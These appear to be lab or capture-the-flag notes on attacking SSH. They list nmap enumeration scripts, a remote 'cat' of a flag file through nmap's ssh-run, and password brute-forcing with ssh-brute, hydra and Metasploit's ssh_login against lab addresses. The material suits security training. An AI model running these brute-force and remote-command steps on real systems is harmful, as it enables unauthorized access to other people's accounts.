- `nmap -A -T4 -p 22 --script ssh2-enum-algos 10.0.1.22`
- "encryption_algorithms" are supported by the SSH server
  - `nmap -T4 --script=ssh2-enum-algos 10.0.1.22`
- Getting ssh hostkey
  - `nmap -T4 --script=ssh-hostkey --script-args ssh_hostkey=full 10.0.1.22`
- Checking authentication for the user
  - `nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=student" 10.0.1.22`
- Fetching the flag from /home/student/FLAG by using nmap ssh-run script
  - `nmap -p 22 --script=ssh-run --script-args="ssh-run.cmd=cat /home/student/FLAG, ssh-run,username=student,ssh-run.password=" 10.0.1.22`
- Finding the password of user “administrator” use appropriate nmap scripts with password dictionary: /usr/share/nmap/nselib/data/passwords.lst
  - `echo "administrator" > users`
  - `nmap -p 22 --script ssh-brute --script-args userdb=/root/users 10.0.1.22`
  - or `hydra -l administrator -P /usr/share/nmap/nselib/data/passwords.lst 10.0.1.22 ssh`



- using msfconsole
  - `msfconsole`
  - `use auxiliary/scanner/ssh/ssh_login`
  - `set RHOSTS 192.40.231.3`
  - `set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt`
  - `set STOP_ON_SUCCESS true`
  - `set verbose true`
  - `exploit`
 
